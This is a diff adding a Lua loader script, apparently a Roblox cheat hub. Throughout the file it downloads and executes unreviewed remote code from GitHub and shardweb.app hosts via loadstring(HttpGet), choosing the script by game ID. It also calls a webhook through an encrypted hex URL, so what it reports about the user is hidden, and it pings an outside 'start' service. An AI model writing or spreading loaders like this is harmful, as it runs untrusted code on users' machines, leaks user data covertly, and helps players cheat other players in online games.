@@ -1,0 +1,54 @@
+local URL_BROOKHAVEN = "https://raw.githubusercontent.com/olliverwillianvale-lgtm/Fire-X/refs/heads/main/Frost%20Gostosos"
+local URL_BRAINROT = "https://raw.githubusercontent.com/olliverwillianvale-lgtm/Fire-X/refs/heads/main/Sai%20daqui%20Web%20Mandrake"
+local URL_UNIVERSAL = "https://raw.githubusercontent.com/studiosfire/Fire-hub-/refs/heads/main/Universal.lua"
+
+local ID_BROOKHAVEN = 4924922222
+local ID_BRAINROT = 109983668079237
+
+local ok_web, requestWebhook = pcall(function()
+    return loadstring(game:HttpGet("https://blox-webhook.shardweb.app/script/library"))()
+end)
+
+if ok_web and type(requestWebhook) == "function" then
+    local cryptUrl = "61709e1c846e0e702711ef66297a1cbbbb25cfe0fddde60b55026752604b354d277afc2869bb3525fbf7b9897ecf0c1ec3d8b6f2fb85db014b14877e6f7250d4f052fbde9827f19e074813f8381c15f448cf13f7e931082d54d1296f69f9d49aa797d58f85f944fd991b08a144ca3935b46a644d396df0966e181530d0e29970dd357dcaea0eac72c46420ed29288766f4cdb6f784150d3ba7ccbb68ffa6812e3b695abdf313c2899828e67ce113dc33aa12da5f8ccb6d116aff69d729015c8ff060d7b04e50fde0ba1c5bdf3087769e3e33bf85e470b20ec47c2475e19bf10e"
+    pcall(function()
+        requestWebhook(cryptUrl)
+        print("requestWebhook executado.")
+    end)
+else
+    warn("Falha ao carregar requestWebhook library. Continuando sem webhook.")
+end
+
+pcall(function()
+    print(game:HttpGet("https://nexviewsservice.shardweb.app/services/fire_hub/start"))
+end)
+
+local function safeLoad(url)
+    local success, err = pcall(function()
+        local source = game:HttpGet(url)
+        local fn = (loadstring and loadstring(source)) or (load and load(source))
+        if fn then
+            fn()
+            print("Script carregado com sucesso:", url)
+        else
+            warn("Erro ao compilar script:", url)
+        end
+    end)
+    if not success then
+        warn("Falha ao executar script:", err)
+    end
+end
+
+local placeId = game.PlaceId
+print("Jogo detectado (PlaceId):", placeId)
+
+if placeId == ID_BROOKHAVEN then
+    print("Brookhaven detectado. Executando script correspondente...")
+    safeLoad(URL_BROOKHAVEN)
+elseif placeId == ID_BRAINROT then
+    print("Roube um Brainrot detectado. Executando script correspondente...")
+    safeLoad(URL_BRAINROT)
+else
+    print("Outro jogo detectado. Executando loader universal...")
+    safeLoad(URL_UNIVERSAL)
+end
